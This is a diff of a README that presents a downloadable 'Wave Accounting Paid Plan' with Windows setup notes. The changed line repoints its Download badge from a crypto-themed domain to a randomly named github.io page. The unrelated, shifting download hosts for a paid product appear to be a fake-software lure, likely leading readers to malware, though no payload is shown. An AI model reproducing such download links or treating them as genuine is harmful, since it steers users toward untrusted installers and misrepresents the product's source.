@@ -6,7 +6,7 @@ It gathers presets, naming rules, and automation that map directly to how teams 
 
 Focus areas include Windows 10/11 driver choices, cache placement, and the file formats Wave Accounting Paid Plan sends to other tools.
 
-[![Download Wave Accounting Paid Plan](https://img.shields.io/badge/Download-Wave_Accounting_Paid_Plan-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Wave Accounting Paid Plan](https://img.shields.io/badge/Download-Wave_Accounting_Paid_Plan-blueviolet)](https://onadomaevxxw.github.io/.github/Wave-Accounting)
 
 ---
 
